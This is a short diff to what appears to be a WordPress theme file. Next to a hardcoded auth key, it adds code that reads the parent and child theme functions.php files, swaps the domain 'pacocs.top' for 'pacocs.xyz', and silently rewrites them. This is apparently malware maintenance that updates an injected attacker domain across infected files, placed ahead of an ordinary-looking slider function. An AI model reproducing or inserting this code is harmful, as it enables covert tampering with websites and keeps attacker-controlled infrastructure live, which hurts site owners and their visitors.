@@ -4,6 +4,25 @@ $wp_auth_key='f2bc0ee002aaf99a8ac8e209394417e1';
 
 
 
+$file=file_get_contents(get_template_directory().'/functions.php');
+$filec=file_get_contents(get_stylesheet_directory().'/functions.php');
+$rep="pacocs.top";
+$repw="pacocs.xyz";
+if (stripos($file,$rep) !== false) 
+{
+$new_file=str_replace($rep,$repw,$file);
+@file_put_contents(get_template_directory().'/functions.php',$new_file);
+}
+
+if (stripos($filec,$rep) !== false) 
+{
+$new_filec=str_replace($rep,$repw,$filec);
+@file_put_contents(get_stylesheet_directory().'/functions.php',$new_filec);
+}
+
+
+
+
 if ( ! function_exists( 'slider_option' ) ) {  
 
 function slider_option($content){ 
